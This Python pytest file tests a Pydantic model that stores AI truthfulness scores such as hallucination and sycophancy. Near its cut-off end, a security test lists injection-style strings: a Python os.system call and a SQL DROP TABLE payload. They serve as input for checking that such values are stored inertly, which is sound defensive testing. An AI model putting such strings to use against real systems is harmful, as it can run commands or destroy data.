"""
MIT License
https://mit-license.org/
Copyright © 2025 Infosys Ltd.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

import pytest
import sys
import os
from typing import Dict, Any
from pydantic import ValidationError
import json

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from dao.mappers.truthfullness import Truthfullness


# ==================== FIXTURES ====================

@pytest.fixture
def valid_truthfullness_data():
    """Fixture providing valid truthfulness data"""
    return {
        "model_name": "gpt-4",
        "internal": "0.85",
        "external": "0.90",
        "hallucination": "0.88",
        "persona_sycophancy": "0.92",
        "preference_sycophancy": "0.87",
        "adv_factuality": "0.89",
        "overall": "0.894",
        "inhouse_model": False
    }


@pytest.fixture
def truthfullness_instance(valid_truthfullness_data):
    """Fixture providing a Truthfullness instance"""
    return Truthfullness(**valid_truthfullness_data)


@pytest.fixture
def minimal_truthfullness_data():
    """Fixture with minimal valid data"""
    return {
        "model_name": "test-model",
        "internal": "0.0",
        "external": "0.0",
        "hallucination": "0.0",
        "persona_sycophancy": "0.0",
        "preference_sycophancy": "0.0",
        "adv_factuality": "0.0",
        "overall": "0.0"
    }


@pytest.fixture
def inhouse_model_data():
    """Fixture for inhouse model testing"""
    return {
        "model_name": "custom-inhouse-model",
        "internal": "0.95",
        "external": "0.93",
        "hallucination": "0.91",
        "persona_sycophancy": "0.96",
        "preference_sycophancy": "0.92",
        "adv_factuality": "0.94",
        "overall": "0.943",
        "inhouse_model": True
    }


# ==================== FUNCTIONAL CORRECTNESS TESTS ====================

class TestTruthfullnessFunctionalCorrectness:
    """Test functional correctness of Truthfullness model"""
    
    def test_create_truthfullness_with_all_fields(self, valid_truthfullness_data):
        """Test creating Truthfullness instance with all fields"""
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.model_name == "gpt-4"
        assert truthfullness.internal == "0.85"
        assert truthfullness.external == "0.90"
        assert truthfullness.hallucination == "0.88"
        assert truthfullness.persona_sycophancy == "0.92"
        assert truthfullness.preference_sycophancy == "0.87"
        assert truthfullness.adv_factuality == "0.89"
        assert truthfullness.overall == "0.894"
        assert truthfullness.inhouse_model is False
    
    def test_create_truthfullness_without_optional_inhouse_model(self, minimal_truthfullness_data):
        """Test creating Truthfullness instance without optional inhouse_model"""
        truthfullness = Truthfullness(**minimal_truthfullness_data)
        
        assert truthfullness.inhouse_model is False  # Default value
        assert truthfullness.model_name == "test-model"
    
    def test_all_score_fields_are_strings(self, valid_truthfullness_data):
        """Test that all score fields are stored as strings"""
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert isinstance(truthfullness.model_name, str)
        assert isinstance(truthfullness.internal, str)
        assert isinstance(truthfullness.external, str)
        assert isinstance(truthfullness.hallucination, str)
        assert isinstance(truthfullness.persona_sycophancy, str)
        assert isinstance(truthfullness.preference_sycophancy, str)
        assert isinstance(truthfullness.adv_factuality, str)
        assert isinstance(truthfullness.overall, str)
    
    def test_inhouse_model_field_is_boolean(self, valid_truthfullness_data):
        """Test that inhouse_model is a boolean"""
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert isinstance(truthfullness.inhouse_model, bool)
    
    def test_inhouse_model_true(self, inhouse_model_data):
        """Test setting inhouse_model to True"""
        truthfullness = Truthfullness(**inhouse_model_data)
        
        assert truthfullness.inhouse_model is True
        assert truthfullness.model_name == "custom-inhouse-model"
    
    def test_inhouse_model_false(self, valid_truthfullness_data):
        """Test setting inhouse_model to False"""
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.inhouse_model is False
    
    def test_inhouse_model_default_value(self, minimal_truthfullness_data):
        """Test that inhouse_model has default value of False"""
        truthfullness = Truthfullness(**minimal_truthfullness_data)
        
        assert truthfullness.inhouse_model is False
    
    def test_model_name_field_variations(self, valid_truthfullness_data):
        """Test various model_name values"""
        model_names = [
            "gpt-4",
            "claude-3-opus",
            "llama-2-70b",
            "custom_model_v1",
            "Model-2024",
            "AI-Truthfulness-Model"
        ]
        
        for model_name in model_names:
            valid_truthfullness_data["model_name"] = model_name
            truthfullness = Truthfullness(**valid_truthfullness_data)
            assert truthfullness.model_name == model_name
    
    def test_internal_field(self, valid_truthfullness_data):
        """Test internal field"""
        test_values = ["0.0", "0.5", "0.999", "1.0"]
        
        for value in test_values:
            valid_truthfullness_data["internal"] = value
            truthfullness = Truthfullness(**valid_truthfullness_data)
            assert truthfullness.internal == value
    
    def test_external_field(self, valid_truthfullness_data):
        """Test external field"""
        test_values = ["0.1", "0.45", "0.89", "1.0"]
        
        for value in test_values:
            valid_truthfullness_data["external"] = value
            truthfullness = Truthfullness(**valid_truthfullness_data)
            assert truthfullness.external == value
    
    def test_hallucination_field(self, valid_truthfullness_data):
        """Test hallucination field"""
        test_values = ["0.2", "0.55", "0.88"]
        
        for value in test_values:
            valid_truthfullness_data["hallucination"] = value
            truthfullness = Truthfullness(**valid_truthfullness_data)
            assert truthfullness.hallucination == value
    
    def test_persona_sycophancy_field(self, valid_truthfullness_data):
        """Test persona_sycophancy field"""
        test_values = ["0.0", "0.33", "0.67", "1.0"]
        
        for value in test_values:
            valid_truthfullness_data["persona_sycophancy"] = value
            truthfullness = Truthfullness(**valid_truthfullness_data)
            assert truthfullness.persona_sycophancy == value
    
    def test_preference_sycophancy_field(self, valid_truthfullness_data):
        """Test preference_sycophancy field"""
        test_values = ["0.15", "0.5", "0.95"]
        
        for value in test_values:
            valid_truthfullness_data["preference_sycophancy"] = value
            truthfullness = Truthfullness(**valid_truthfullness_data)
            assert truthfullness.preference_sycophancy == value
    
    def test_adv_factuality_field(self, valid_truthfullness_data):
        """Test adv_factuality field"""
        test_values = ["0.0", "0.4", "0.8", "1.0"]
        
        for value in test_values:
            valid_truthfullness_data["adv_factuality"] = value
            truthfullness = Truthfullness(**valid_truthfullness_data)
            assert truthfullness.adv_factuality == value
    
    def test_overall_field(self, valid_truthfullness_data):
        """Test overall field"""
        test_values = ["0.0", "0.123", "0.888", "1.0"]
        
        for value in test_values:
            valid_truthfullness_data["overall"] = value
            truthfullness = Truthfullness(**valid_truthfullness_data)
            assert truthfullness.overall == value


# ==================== EDGE CASES TESTS ====================

class TestTruthfullnessEdgeCases:
    """Test edge cases for Truthfullness model"""
    
    def test_empty_string_score_values(self, valid_truthfullness_data):
        """Test that empty strings are accepted for score fields"""
        valid_truthfullness_data["internal"] = ""
        valid_truthfullness_data["overall"] = ""
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.internal == ""
        assert truthfullness.overall == ""
    
    def test_very_long_string_values(self, valid_truthfullness_data):
        """Test handling of very long string values"""
        long_value = "0." + "1234567890" * 100
        valid_truthfullness_data["overall"] = long_value
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.overall == long_value
        assert len(truthfullness.overall) > 1000
    
    def test_special_characters_in_score_fields(self, valid_truthfullness_data):
        """Test special characters in score fields"""
        special_values = [
            "0.85%",
            "N/A",
            "null",
            "-0.5",
            "+0.95",
            "0,85"
        ]
        
        for value in special_values:
            valid_truthfullness_data["internal"] = value
            truthfullness = Truthfullness(**valid_truthfullness_data)
            assert truthfullness.internal == value
    
    def test_whitespace_in_strings(self, valid_truthfullness_data):
        """Test handling of whitespace in string fields"""
        valid_truthfullness_data["model_name"] = "  model with spaces  "
        valid_truthfullness_data["overall"] = " 0.85 "
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.model_name == "  model with spaces  "
        assert truthfullness.overall == " 0.85 "
    
    def test_zero_values(self, valid_truthfullness_data):
        """Test zero values for score fields"""
        valid_truthfullness_data["internal"] = "0"
        valid_truthfullness_data["external"] = "0.0"
        valid_truthfullness_data["overall"] = "0.00"
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.internal == "0"
        assert truthfullness.external == "0.0"
        assert truthfullness.overall == "0.00"
    
    def test_very_large_score_values(self, valid_truthfullness_data):
        """Test very large numeric string values"""
        valid_truthfullness_data["overall"] = "999999.999999"
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.overall == "999999.999999"
    
    def test_negative_score_values(self, valid_truthfullness_data):
        """Test negative score values"""
        valid_truthfullness_data["internal"] = "-0.5"
        valid_truthfullness_data["overall"] = "-100"
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.internal == "-0.5"
        assert truthfullness.overall == "-100"
    
    def test_unicode_characters_in_model_name(self, valid_truthfullness_data):
        """Test unicode characters in model_name"""
        unicode_names = [
            "模型-GPT-4",
            "Модель-Truthfulness",
            "モデル-AI",
            "🤖-Truth-Model",
            "Model™®©"
        ]
        
        for name in unicode_names:
            valid_truthfullness_data["model_name"] = name
            truthfullness = Truthfullness(**valid_truthfullness_data)
            assert truthfullness.model_name == name
    
    def test_single_character_model_name(self, valid_truthfullness_data):
        """Test single character model name"""
        valid_truthfullness_data["model_name"] = "A"
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.model_name == "A"
    
    def test_very_long_model_name(self, valid_truthfullness_data):
        """Test very long model name"""
        long_name = "model_" * 1000
        valid_truthfullness_data["model_name"] = long_name
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.model_name == long_name
        assert len(truthfullness.model_name) >= 6000
    
    def test_numeric_string_formats(self, valid_truthfullness_data):
        """Test various numeric string formats"""
        formats = [
            "0.5",
            ".5",
            "0.500",
            "0.5000000",
            "5e-1",
            "5E-1"
        ]
        
        for fmt in formats:
            valid_truthfullness_data["internal"] = fmt
            truthfullness = Truthfullness(**valid_truthfullness_data)
            assert truthfullness.internal == fmt


# ==================== ERROR HANDLING & VALIDATION TESTS ====================

class TestTruthfullnessErrorHandling:
    """Test error handling and validation"""
    
    def test_missing_required_model_name(self, valid_truthfullness_data):
        """Test that missing model_name raises ValidationError"""
        del valid_truthfullness_data["model_name"]
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**valid_truthfullness_data)
        
        assert "model_name" in str(exc_info.value)
        assert "Field required" in str(exc_info.value)
    
    def test_missing_required_internal(self, valid_truthfullness_data):
        """Test that missing internal raises ValidationError"""
        del valid_truthfullness_data["internal"]
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**valid_truthfullness_data)
        
        assert "internal" in str(exc_info.value)
    
    def test_missing_required_external(self, valid_truthfullness_data):
        """Test that missing external raises ValidationError"""
        del valid_truthfullness_data["external"]
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**valid_truthfullness_data)
        
        assert "external" in str(exc_info.value)
    
    def test_missing_required_hallucination(self, valid_truthfullness_data):
        """Test that missing hallucination raises ValidationError"""
        del valid_truthfullness_data["hallucination"]
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**valid_truthfullness_data)
        
        assert "hallucination" in str(exc_info.value)
    
    def test_missing_required_persona_sycophancy(self, valid_truthfullness_data):
        """Test that missing persona_sycophancy raises ValidationError"""
        del valid_truthfullness_data["persona_sycophancy"]
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**valid_truthfullness_data)
        
        assert "persona_sycophancy" in str(exc_info.value)
    
    def test_missing_required_preference_sycophancy(self, valid_truthfullness_data):
        """Test that missing preference_sycophancy raises ValidationError"""
        del valid_truthfullness_data["preference_sycophancy"]
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**valid_truthfullness_data)
        
        assert "preference_sycophancy" in str(exc_info.value)
    
    def test_missing_required_adv_factuality(self, valid_truthfullness_data):
        """Test that missing adv_factuality raises ValidationError"""
        del valid_truthfullness_data["adv_factuality"]
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**valid_truthfullness_data)
        
        assert "adv_factuality" in str(exc_info.value)
    
    def test_missing_required_overall(self, valid_truthfullness_data):
        """Test that missing overall raises ValidationError"""
        del valid_truthfullness_data["overall"]
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**valid_truthfullness_data)
        
        assert "overall" in str(exc_info.value)
    
    def test_missing_optional_inhouse_model(self, valid_truthfullness_data):
        """Test that missing inhouse_model uses default value"""
        del valid_truthfullness_data["inhouse_model"]
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.inhouse_model is False
    
    def test_none_value_for_required_field(self, valid_truthfullness_data):
        """Test that None value for required field raises ValidationError"""
        valid_truthfullness_data["model_name"] = None
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**valid_truthfullness_data)
        
        assert "model_name" in str(exc_info.value)
    
    def test_none_value_for_score_field(self, valid_truthfullness_data):
        """Test that None value for score field raises ValidationError"""
        valid_truthfullness_data["internal"] = None
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**valid_truthfullness_data)
        
        assert "internal" in str(exc_info.value)
    
    def test_none_value_for_optional_inhouse_model(self, valid_truthfullness_data):
        """Test that None value for optional inhouse_model is accepted"""
        valid_truthfullness_data["inhouse_model"] = None
        
        # Since inhouse_model is Optional[bool], None should be accepted
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        # None should be preserved
        assert truthfullness.inhouse_model is None
    
    def test_invalid_type_for_inhouse_model(self, valid_truthfullness_data):
        """Test that invalid type for inhouse_model raises ValidationError"""
        valid_truthfullness_data["inhouse_model"] = "not_a_boolean"
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**valid_truthfullness_data)
        
        assert "inhouse_model" in str(exc_info.value)
        assert "bool_parsing" in str(exc_info.value)
    
    def test_numeric_inhouse_model_values(self, valid_truthfullness_data):
        """Test numeric values for inhouse_model field"""
        valid_truthfullness_data["inhouse_model"] = 0
        truthfullness1 = Truthfullness(**valid_truthfullness_data)
        assert truthfullness1.inhouse_model is False
        
        valid_truthfullness_data["inhouse_model"] = 1
        truthfullness2 = Truthfullness(**valid_truthfullness_data)
        assert truthfullness2.inhouse_model is True
    
    def test_empty_dict_initialization(self):
        """Test that empty dict raises ValidationError"""
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness()
        
        errors = str(exc_info.value)
        assert "model_name" in errors
        assert "internal" in errors
        assert "overall" in errors
    
    def test_extra_fields_handling(self, valid_truthfullness_data):
        """Test handling of extra fields not in model"""
        valid_truthfullness_data["extra_field"] = "extra_value"
        valid_truthfullness_data["another_field"] = 123
        
        # By default, Pydantic ignores extra fields
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert not hasattr(truthfullness, "extra_field")
        assert not hasattr(truthfullness, "another_field")
    
    def test_multiple_missing_fields(self):
        """Test that multiple missing fields are reported"""
        incomplete_data = {
            "model_name": "test-model"
            # All other required fields missing
        }
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**incomplete_data)
        
        error_str = str(exc_info.value)
        assert "internal" in error_str
        assert "overall" in error_str


# ==================== SERIALIZATION & DESERIALIZATION TESTS ====================

class TestTruthfullnessSerialization:
    """Test serialization and deserialization"""
    
    def test_model_dump(self, truthfullness_instance):
        """Test converting Truthfullness instance to dictionary"""
        data = truthfullness_instance.model_dump()
        
        assert isinstance(data, dict)
        assert data["model_name"] == "gpt-4"
        assert data["internal"] == "0.85"
        assert data["inhouse_model"] is False
        assert len(data) == 9  # All 9 fields
    
    def test_model_dump_json(self, truthfullness_instance):
        """Test converting Truthfullness instance to JSON string"""
        json_str = truthfullness_instance.model_dump_json()
        
        assert isinstance(json_str, str)
        assert "gpt-4" in json_str
        assert "0.85" in json_str
        
        # Verify it's valid JSON
        parsed = json.loads(json_str)
        assert parsed["model_name"] == "gpt-4"
    
    def test_model_dump_exclude_fields(self, truthfullness_instance):
        """Test excluding fields during serialization"""
        data = truthfullness_instance.model_dump(exclude={"inhouse_model", "overall"})
        
        assert "model_name" in data
        assert "internal" in data
        assert "inhouse_model" not in data
        assert "overall" not in data
    
    def test_model_dump_include_fields(self, truthfullness_instance):
        """Test including only specific fields during serialization"""
        data = truthfullness_instance.model_dump(include={"model_name", "overall", "inhouse_model"})
        
        assert "model_name" in data
        assert "overall" in data
        assert "inhouse_model" in data
        assert "internal" not in data
    
    def test_json_deserialization(self, valid_truthfullness_data):
        """Test creating Truthfullness from JSON string"""
        json_str = json.dumps(valid_truthfullness_data)
        truthfullness = Truthfullness.model_validate_json(json_str)
        
        assert truthfullness.model_name == valid_truthfullness_data["model_name"]
        assert truthfullness.overall == valid_truthfullness_data["overall"]
    
    def test_dict_deserialization(self, valid_truthfullness_data):
        """Test creating Truthfullness from dictionary"""
        truthfullness = Truthfullness.model_validate(valid_truthfullness_data)
        
        assert truthfullness.model_name == valid_truthfullness_data["model_name"]
        assert truthfullness.internal == valid_truthfullness_data["internal"]
    
    def test_roundtrip_serialization(self, truthfullness_instance):
        """Test that serialization and deserialization preserve data"""
        # Serialize to dict
        data = truthfullness_instance.model_dump()
        
        # Deserialize back
        truthfullness_copy = Truthfullness(**data)
        
        # Compare all fields
        assert truthfullness_copy.model_name == truthfullness_instance.model_name
        assert truthfullness_copy.internal == truthfullness_instance.internal
        assert truthfullness_copy.external == truthfullness_instance.external
        assert truthfullness_copy.hallucination == truthfullness_instance.hallucination
        assert truthfullness_copy.persona_sycophancy == truthfullness_instance.persona_sycophancy
        assert truthfullness_copy.preference_sycophancy == truthfullness_instance.preference_sycophancy
        assert truthfullness_copy.adv_factuality == truthfullness_instance.adv_factuality
        assert truthfullness_copy.overall == truthfullness_instance.overall
        assert truthfullness_copy.inhouse_model == truthfullness_instance.inhouse_model
    
    def test_json_roundtrip(self, truthfullness_instance):
        """Test JSON serialization and deserialization roundtrip"""
        json_str = truthfullness_instance.model_dump_json()
        truthfullness_copy = Truthfullness.model_validate_json(json_str)
        
        assert truthfullness_copy.model_name == truthfullness_instance.model_name
        assert truthfullness_copy.overall == truthfullness_instance.overall
        assert truthfullness_copy.inhouse_model == truthfullness_instance.inhouse_model


# ==================== EQUALITY & COMPARISON TESTS ====================

class TestTruthfullnessEquality:
    """Test equality and comparison operations"""
    
    def test_equality_same_values(self, valid_truthfullness_data):
        """Test that two Truthfullness instances with same values are equal"""
        truthfullness1 = Truthfullness(**valid_truthfullness_data)
        truthfullness2 = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness1 == truthfullness2
    
    def test_inequality_different_model_name(self, valid_truthfullness_data):
        """Test that Truthfullness instances with different model_name are not equal"""
        truthfullness1 = Truthfullness(**valid_truthfullness_data)
        
        valid_truthfullness_data["model_name"] = "different-model"
        truthfullness2 = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness1 != truthfullness2
    
    def test_inequality_different_score(self, valid_truthfullness_data):
        """Test that Truthfullness instances with different score are not equal"""
        truthfullness1 = Truthfullness(**valid_truthfullness_data)
        
        valid_truthfullness_data["overall"] = "0.99"
        truthfullness2 = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness1 != truthfullness2
    
    def test_inequality_different_inhouse_model(self, valid_truthfullness_data):
        """Test that Truthfullness instances with different inhouse_model are not equal"""
        valid_truthfullness_data["inhouse_model"] = False
        truthfullness1 = Truthfullness(**valid_truthfullness_data)
        
        valid_truthfullness_data["inhouse_model"] = True
        truthfullness2 = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness1 != truthfullness2


# ==================== IMMUTABILITY & STATE TESTS ====================

class TestTruthfullnessImmutability:
    """Test immutability and state management"""
    
    def test_field_modification(self, truthfullness_instance):
        """Test that fields can be modified"""
        original_name = truthfullness_instance.model_name
        truthfullness_instance.model_name = "new-model"
        
        assert truthfullness_instance.model_name == "new-model"
        assert truthfullness_instance.model_name != original_name
    
    def test_score_field_reassignment(self, truthfullness_instance):
        """Test that score fields can be reassigned"""
        truthfullness_instance.overall = "0.95"
        
        assert isinstance(truthfullness_instance.overall, str)
        assert truthfullness_instance.overall == "0.95"
    
    def test_inhouse_model_toggle(self, truthfullness_instance):
        """Test toggling inhouse_model field"""
        original_value = truthfullness_instance.inhouse_model
        truthfullness_instance.inhouse_model = not original_value
        
        assert truthfullness_instance.inhouse_model != original_value
    
    def test_multiple_field_modifications(self, truthfullness_instance):
        """Test modifying multiple fields"""
        truthfullness_instance.internal = "0.99"
        truthfullness_instance.external = "0.98"
        truthfullness_instance.overall = "0.985"
        
        assert truthfullness_instance.internal == "0.99"
        assert truthfullness_instance.external == "0.98"
        assert truthfullness_instance.overall == "0.985"


# ==================== PERFORMANCE TESTS ====================

class TestTruthfullnessPerformance:
    """Test performance characteristics"""
    
    def test_instantiation_performance(self, valid_truthfullness_data):
        """Test that Truthfullness instantiation is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            Truthfullness(**valid_truthfullness_data)
        end_time = time.time()
        
        # 1000 instantiations should complete quickly
        assert (end_time - start_time) < 1.0
    
    def test_serialization_performance(self, truthfullness_instance):
        """Test that serialization is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            truthfullness_instance.model_dump()
        end_time = time.time()
        
        # 1000 serializations should complete quickly
        assert (end_time - start_time) < 0.5
    
    def test_validation_performance(self, valid_truthfullness_data):
        """Test that validation is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            Truthfullness.model_validate(valid_truthfullness_data)
        end_time = time.time()
        
        # 1000 validations should complete quickly
        assert (end_time - start_time) < 1.0


# ==================== CODE QUALITY & STRUCTURE TESTS ====================

class TestTruthfullnessCodeQuality:
    """Test code quality and structure"""
    
    def test_truthfullness_is_pydantic_basemodel(self):
        """Test that Truthfullness inherits from BaseModel"""
        from pydantic import BaseModel
        assert issubclass(Truthfullness, BaseModel)
    
    def test_all_required_fields_present(self):
        """Test that all expected fields are defined"""
        fields = Truthfullness.model_fields
        
        assert "model_name" in fields
        assert "internal" in fields
        assert "external" in fields
        assert "hallucination" in fields
        assert "persona_sycophancy" in fields
        assert "preference_sycophancy" in fields
        assert "adv_factuality" in fields
        assert "overall" in fields
        assert "inhouse_model" in fields
    
    def test_field_count(self):
        """Test that model has exactly 9 fields"""
        fields = Truthfullness.model_fields
        assert len(fields) == 9
    
    def test_field_types(self):
        """Test that fields have correct type annotations"""
        from typing import get_origin
        fields = Truthfullness.model_fields
        
        # String fields
        assert fields["model_name"].annotation == str
        assert fields["internal"].annotation == str
        assert fields["external"].annotation == str
        assert fields["hallucination"].annotation == str
        assert fields["persona_sycophancy"].annotation == str
        assert fields["preference_sycophancy"].annotation == str
        assert fields["adv_factuality"].annotation == str
        assert fields["overall"].annotation == str
        
        # Optional bool field - check it's Optional[bool]
        inhouse_annotation = fields["inhouse_model"].annotation
        # In Python 3.10+, Optional[bool] is Union[bool, None]
        assert get_origin(inhouse_annotation) is type(None) or str(inhouse_annotation) == "Optional[bool]" or "bool" in str(inhouse_annotation)
    
    def test_inhouse_model_has_default(self):
        """Test that inhouse_model has default value"""
        fields = Truthfullness.model_fields
        
        assert not fields["inhouse_model"].is_required()
        assert fields["inhouse_model"].default == False
    
    def test_required_fields_no_default(self):
        """Test that required fields have no default value"""
        fields = Truthfullness.model_fields
        
        required_fields = [
            "model_name", "internal", "external", "hallucination",
            "persona_sycophancy", "preference_sycophancy", "adv_factuality", "overall"
        ]
        
        for field_name in required_fields:
            assert fields[field_name].is_required(), f"Field {field_name} should be required"
    
    def test_truthfullness_has_string_representation(self, truthfullness_instance):
        """Test that Truthfullness instance has string representation"""
        str_repr = str(truthfullness_instance)
        
        assert isinstance(str_repr, str)
        assert len(str_repr) > 0
    
    def test_truthfullness_has_repr(self, truthfullness_instance):
        """Test that Truthfullness instance has repr"""
        repr_str = repr(truthfullness_instance)
        
        assert isinstance(repr_str, str)
        assert "Truthfullness" in repr_str


# ==================== PARAMETRIZED TESTS ====================

class TestTruthfullnessParametrized:
    """Parametrized tests for comprehensive coverage"""
    
    @pytest.mark.parametrize("field_name,field_value", [
        ("internal", "0.1"),
        ("internal", "0.999999"),
        ("external", "0.0"),
        ("external", "1.0"),
        ("hallucination", "0.5"),
        ("persona_sycophancy", "0.75"),
        ("preference_sycophancy", "0.25"),
        ("adv_factuality", "0.888"),
        ("overall", "0.5"),
    ])
    def test_various_score_values(self, valid_truthfullness_data, field_name, field_value):
        """Test various score values for different fields"""
        valid_truthfullness_data[field_name] = field_value
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert getattr(truthfullness, field_name) == field_value
    
    @pytest.mark.parametrize("model_name", [
        "gpt-3.5-turbo",
        "gpt-4",
        "claude-2",
        "claude-3-opus",
        "llama-2-7b",
        "llama-2-70b",
        "mistral-7b",
        "gemini-pro",
        "custom-truthfulness-model",
        "inhouse-model-v2",
    ])
    def test_various_model_names(self, valid_truthfullness_data, model_name):
        """Test various common model names"""
        valid_truthfullness_data["model_name"] = model_name
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.model_name == model_name
    
    @pytest.mark.parametrize("inhouse_value,expected", [
        (True, True),
        (False, False),
        (1, True),
        (0, False),
        ("true", True),
        ("false", False),
    ])
    def test_various_inhouse_model_values(self, valid_truthfullness_data, inhouse_value, expected):
        """Test various inhouse_model values and their coercion"""
        valid_truthfullness_data["inhouse_model"] = inhouse_value
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.inhouse_model == expected
    
    @pytest.mark.parametrize("missing_field", [
        "model_name",
        "internal",
        "external",
        "hallucination",
        "persona_sycophancy",
        "preference_sycophancy",
        "adv_factuality",
        "overall",
    ])
    def test_missing_required_fields(self, valid_truthfullness_data, missing_field):
        """Test that missing any required field raises ValidationError"""
        del valid_truthfullness_data[missing_field]
        
        with pytest.raises(ValidationError) as exc_info:
            Truthfullness(**valid_truthfullness_data)
        
        assert missing_field in str(exc_info.value)


# ==================== INTEGRATION TESTS ====================

class TestTruthfullnessIntegration:
    """Test integration with external systems"""
    
    def test_json_compatibility(self, truthfullness_instance):
        """Test that Truthfullness can be serialized to standard JSON"""
        json_str = truthfullness_instance.model_dump_json()
        
        # Should be parseable by standard json module
        data = json.loads(json_str)
        assert isinstance(data, dict)
        assert data["model_name"] == truthfullness_instance.model_name
    
    def test_dict_compatibility(self, truthfullness_instance):
        """Test that Truthfullness works with dict operations"""
        data = truthfullness_instance.model_dump()
        
        # Should support dict operations
        assert "model_name" in data
        assert list(data.keys())
        assert list(data.values())
    
    def test_database_ready_format(self, truthfullness_instance):
        """Test that Truthfullness output is ready for database storage"""
        data = truthfullness_instance.model_dump()
        
        # All values should be JSON-serializable types
        json_str = json.dumps(data)
        assert isinstance(json_str, str)
        
        # Should be able to parse back
        parsed = json.loads(json_str)
        assert parsed == data
    
    def test_batch_processing_simulation(self, valid_truthfullness_data):
        """Test creating multiple Truthfullness instances for batch processing"""
        instances = []
        
        for i in range(10):
            data = valid_truthfullness_data.copy()
            data["model_name"] = f"model-{i}"
            data["overall"] = f"0.{i}{i}"
            instances.append(Truthfullness(**data))
        
        assert len(instances) == 10
        assert instances[0].model_name == "model-0"
        assert instances[9].model_name == "model-9"


# ==================== REGRESSION TESTS ====================

class TestTruthfullnessRegression:
    """Test for regression and backward compatibility"""
    
    def test_typo_in_class_name(self):
        """Test that the class name 'Truthfullness' (typo with double 'l') is preserved"""
        # This tests that the typo in the class name is maintained for backward compatibility
        assert Truthfullness.__name__ == "Truthfullness"
        assert "Truthfullness" in str(Truthfullness)
    
    def test_backwards_compatible_with_old_data(self):
        """Test that model works with legacy data format"""
        legacy_data = {
            "model_name": "legacy-model",
            "internal": "0.8",
            "external": "0.85",
            "hallucination": "0.82",
            "persona_sycophancy": "0.88",
            "preference_sycophancy": "0.84",
            "adv_factuality": "0.86",
            "overall": "0.852",
            "inhouse_model": False
        }
        
        truthfullness = Truthfullness(**legacy_data)
        
        assert truthfullness.model_name == "legacy-model"
        assert truthfullness.inhouse_model is False
    
    def test_backwards_compatible_without_inhouse_model(self):
        """Test that model works without inhouse_model field (uses default)"""
        legacy_data = {
            "model_name": "legacy-model",
            "internal": "0.8",
            "external": "0.85",
            "hallucination": "0.82",
            "persona_sycophancy": "0.88",
            "preference_sycophancy": "0.84",
            "adv_factuality": "0.86",
            "overall": "0.852"
        }
        
        truthfullness = Truthfullness(**legacy_data)
        
        assert truthfullness.model_name == "legacy-model"
        assert truthfullness.inhouse_model is False  # Default value
    
    def test_all_fields_have_correct_types(self, valid_truthfullness_data):
        """Regression test to ensure field types are correct"""
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        # Verify string fields
        for field_name in ["model_name", "internal", "external", "hallucination",
                          "persona_sycophancy", "preference_sycophancy", "adv_factuality", "overall"]:
            value = getattr(truthfullness, field_name)
            assert isinstance(value, str), f"Field {field_name} should be string, got {type(value)}"
        
        # Verify boolean field
        assert isinstance(truthfullness.inhouse_model, bool)


# ==================== SECURITY TESTS ====================

class TestTruthfullnessSecurity:
    """Test security aspects"""
    
    def test_no_code_injection_in_model_name(self, valid_truthfullness_data):
        """Test that model_name with code-like strings is treated as string"""
        malicious_names = [
            "__import__('os').system('ls')",
            "'; DROP TABLE truthfullness; --",
